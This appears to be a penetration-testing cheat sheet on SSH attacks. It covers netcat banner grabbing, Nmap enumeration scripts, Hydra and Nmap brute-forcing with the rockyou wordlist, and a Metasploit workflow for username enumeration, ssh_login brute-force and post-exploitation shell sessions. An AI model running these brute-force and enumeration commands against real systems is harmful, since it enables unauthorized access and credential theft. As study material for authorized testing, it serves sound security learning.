♦ SSH (Secure Shell) Enumeration & Attacks
SSH (Secure Shell) is a network protocol used to securely access and manage remote systems over an unsecured network.
→ Default Port: TCP port 22
→ Purpose: Administer servers and transfer data securely.

♦ Banner Grabbing (Information Gathering)
This technique is used to gather information about the SSH service running on port 22 (e.g., software version).

→ nc 22                                                                           # Connects using Netcat to port 22 to view the SSH banner.

♦ Nmap Enumeration Scripts (Host & Service Discovery)
These Nmap Scripting Engine (NSE) commands are used to gather detailed information about the SSH service.

→ nmap --script ssh-auth-methods -p 22 target-ip                                   # Identifies the authentication methods supported by the server.
→ nmap --script ssh-enum-algos -p 22 target-ip                                     # Enumerates the cryptographic algorithms supported by the server.
→ nmap --script ssh2-enum-algos -p 22 target-ip                                    # Lists the algorithms used in SSH connections (SSH-2).
→ nmap --script ssh-hostkey -p 22 target-ip                                        # Retrieves and displays the public SSH host keys.
→ nmap --script ssh-dss -p 22 target-ip                                            # Checks for the use of DSS (Digital Signature Standard) keys.
→ nmap --script ssh-vuln-cve2018-15473 -p 22 target-ip                             # Checks for CVE-2018-15473 (allows valid username enumeration).
→ nmap --script ssh-brute -p 22 target-ip                                          # Performs a brute-force attack on SSH credentials.

♦ SSH Dictionary and Brute-Force Attacks
These commands attempt to guess valid credentials using wordlists.

→ hydra -l <user> -P /usr/share/wordlists/rockyou.txt <target> ssh                  # Hydra attack using a single username and the rockyou wordlist.
→ nmap <target> -p 22 --script ssh-brute --script-args userdb=admin                 # Nmap's ssh-brute script to guess the password for the 'admin' user.

♦ SSH Enumeration and Brute-Force Login (Metasploit)

Secure Shell → Enumeration. Post 22         # SSH Port
ifconfig → 192.30.120.2                     # Your local IP address
target IP → 192.30.120.3                    # The target machine's IP address

→ service postgresql Start                  # Start the required database service for Metasploit
→ msfconsole                                # Start the Metasploit Framework console
→ workspace -a SSH_Enum                     # Create and switch to a Metasploit workspace
→ setg RHOSTS 192.30.120.3                  # Globally set the target IP
→ setg RHOST 192.30.120.3                   # Globally set the target IP

♦ SSH Version Scanning
→ search type:auxiliary name:ssh            # Search for SSH-related auxiliary modules
→ Use auxiliary/scanner/ssh/ssh_version     # Load the SSH version scanner module
→ show options                              # View required options
→ run                                       # Execute the module

♦ SSH User Enumeration (Optional Step)
→ Search ssh_enumusers                      # Search for user enumeration module
→ Use type:auxiliary name:ssh               # Load the module (e.g., auxiliary/scanner/ssh/ssh_enumusers)
→ Set USER_FILE /usr/.../common_users.txt   # Set the path to the username list
→ run                                       # Execute the module

♦ SSH Login Brute-Force
→ Search openssh / Search type:auxiliary name:ssh            # Search for the login module
→ Use auxiliary/scanner/ssh/ssh_login                        # Load the SSH login brute-forcer module
→ Show options                                               # View required options
→ Set USER_FILE /usr/.../Common_users.txt                    # Set the path to the username list
→ Set PASS_FILE /usr/.../Common_passwords.txt                # Set the path to the password list
→ run                                                        # Execute the brute-force attack

♦ Post-Exploitation Session Management
→ sessions                                   # List active Meterpreter/shell sessions
→ sessions -i 1                              # Interact with the specified session ID (e.g., 1)
→ ls                                         # List files in the current directory (within the shell)
→ /bin/bash -i                               # Attempt to spawn an interactive Bash shell
→ ls                                         # List files in the current directory 
→ whoami                                     # Check the current user in the shell
→ exit / y                                   # Exit the shell session
